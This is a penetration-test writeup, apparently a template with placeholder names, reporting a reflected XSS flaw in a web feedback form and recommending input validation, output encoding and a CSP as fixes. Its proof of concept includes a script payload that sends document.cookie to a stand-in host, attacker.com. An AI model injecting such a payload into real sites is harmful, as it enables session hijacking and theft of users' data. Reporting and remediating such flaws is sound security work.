# Penetration Testing Writeup: XSS in Feedback Form

## Executive Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in [Target
Application]’s feedback form during a penetration test. This allows attackers to
inject scripts that execute in the response, risking user security. This report
provides details and remediation steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Reflected
- **Severity**: High
- **Affected Component**: Feedback form submission
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/feedback`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 29, 2025

### Description

The feedback form reflects user inputs in the response without sanitization,
allowing script injection.

### Impact

- **Session Compromise**: Cookies can be stolen.
- **Phishing**: Fake forms can capture credentials.
- **Data Theft**: Feedback data can be exfiltrated.
- **Reputation Harm**: Defacement can damage trust.

### Proof of Concept

1. Submit the feedback form with: `<script>alert('Reflected XSS');</script>`.
2. Observe an alert on the response page.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Navigate to `https://[target-application]/feedback`.
2. Enter `<script>alert('Reflected XSS');</script>` in the feedback field.
3. Submit and confirm the alert.

## Remediation Recommendations

1. **Input Validation**:
   - Restrict feedback inputs to safe characters.
2. **Output Encoding**:
   - Encode outputs before rendering.
3. **Content Security Policy**:
   - Use CSP: `Content-Security-Policy: script-src 'self';`.
4. **Secure Coding**:
   - Train developers on XSS prevention.
5. **Regular Testing**:
   - Conduct security audits.

## Conclusion

The Reflected XSS vulnerability in [Target Application]’s feedback form requires
immediate remediation.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![Feedback XSS Alert](https://example.com/images/feedback-xss-alert.png)
